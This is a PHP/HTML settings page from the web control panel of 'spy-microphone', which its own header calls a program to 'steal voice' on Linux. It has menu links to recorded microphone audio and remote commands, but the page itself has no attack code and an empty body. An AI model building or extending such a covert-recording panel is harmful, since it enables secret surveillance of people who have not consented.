<?php

#
# Copyright (c) 2018 Barchampas Gerasimos <makindosx@gmail.com>
# spy-microphone is a program for steal voice in gnu/linux OS.
#
# spy-microphone is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as
# published by the Free Software Foundation, either version 3 of the
# License, or (at your option) any later version.
#
#
# spy-microphone is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU Affero General Public License for more details.
#
# You should have received a copy of the GNU Affero General Public License, version 3,
# along with this program.  If not, see <http://www.gnu.org/licenses/>
#

session_start();

 if (!isset($_SESSION['login']))
    {
      header("Location: index.php");
      }

else
{
unset($_SESSION["hard_disk_id"]);
}

?>


﻿<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
      <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

     <title> Spy microphone Controller </title>

     <link rel="Shortcut Icon" type="image/ico" href="favicon.ico">


	<!-- BOOTSTRAP STYLES-->
    <link href="assets/css/bootstrap.css" rel="stylesheet" />
     <!-- FONTAWESOME STYLES-->
    <link href="assets/css/font-awesome.css" rel="stylesheet" />
        <!-- CUSTOM STYLES-->
    <link href="assets/css/custom.css" rel="stylesheet" />
     <!-- GOOGLE FONTS-->
   <link href='http://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css' />
</head>
<body>
    <div id="wrapper">
        <nav class="navbar navbar-default navbar-cls-top " role="navigation" style="margin-bottom: 0">
            <div class="navbar-header">
                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".sidebar-collapse">
                    <span class="sr-only">Toggle navigation</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
                <a class="navbar-brand" href="dashboard.php"> Spy Microphone </a>  
            </div>
  
      <div style="color: white; padding: 15px 50px 5px 50px;float: right; font-size: 16px;"> 
             <?php echo date("d-m-Y H:i"); ?> &nbsp; 
             <a href="logout.php" class="btn btn-danger square-btn-adjust">
              Logout <i class="fa fa-sign-out"></i>
             </a>  
           </div>

        </nav>   
           <!-- /. NAV TOP  -->
                <nav class="navbar-default navbar-side" role="navigation">
            <div class="sidebar-collapse">
                <ul class="nav" id="main-menu">
				<li class="text-center">
                    <img src="assets/img/find_user.png" class="user-image img-responsive"/>
					</li>
				
					
                     <li>
              <a href="dashboard.php"><i class="fa fa-dashboard fa-3x"></i> Dashboard </a>
                    </li>
                     <li>
                        <a  href="ui_elements.php"><i class="fa fa-desktop fa-3x"></i> UI Elements</a>
                    </li>
                   
      <li>
         <a  href="records_microphone.php"><i class="fa fa-microphone fa-3x"></i> Records Microphone</a>
      </li>
                   			
			                   
                    <li>
          <a href="#"><i class="fa fa-sitemap fa-3x"></i> Multi Tasking <span class="fa arrow"></span></a>
                        <ul class="nav nav-second-level">
                            <li>
                                <a href="#">Second Level Link</a>
                            </li>
                            <li>
                                <a href="#">Second Level Link</a>
                            </li>
                            <li>
                                <a href="#">Second Level Link<span class="fa arrow"></span></a>
                                <ul class="nav nav-third-level">
                                    <li>
                                        <a href="#">Third Level Link</a>
                                    </li>
                                    <li>
                                        <a href="#">Third Level Link</a>
                                    </li>
                                    <li>
                                        <a href="#">Third Level Link</a>
                                    </li>

                                </ul>
                               
                            </li>
                        </ul>
                      </li>  

             <li>
               <a href="remote_commands.php"> <i class="fa fa-terminal fa-3x"></i> Remote Commands </a>
             </li>	

             <li>
              <a class="active-menu" href="settings.php"><i class="fa fa-cogs fa-3x"></i> Settings </a>
             </li>

                </ul>
               
            </div>
            
        </nav>  
        <!-- /. NAV SIDE  -->
        <div id="page-wrapper" >
            <div id="page-inner">
                <div class="row">
                    <div class="col-md-12">
                     <h2> Settings </h2>   
                       
                    </div>
                </div>
                 <!-- /. ROW  -->
                 <hr />


    </div>
             <!-- /. PAGE INNER  -->
            </div>
         <!-- /. PAGE WRAPPER  -->
        </div>
     <!-- /. WRAPPER  -->
    <!-- SCRIPTS -AT THE BOTOM TO REDUCE THE LOAD TIME-->
    <!-- JQUERY SCRIPTS -->
    <script src="assets/js/jquery-1.10.2.js"></script>
      <!-- BOOTSTRAP SCRIPTS -->
    <script src="assets/js/bootstrap.min.js"></script>
    <!-- METISMENU SCRIPTS -->
    <script src="assets/js/jquery.metisMenu.js"></script>
      <!-- CUSTOM SCRIPTS -->
    <script src="assets/js/custom.js"></script>
    
   
</body>
</html>
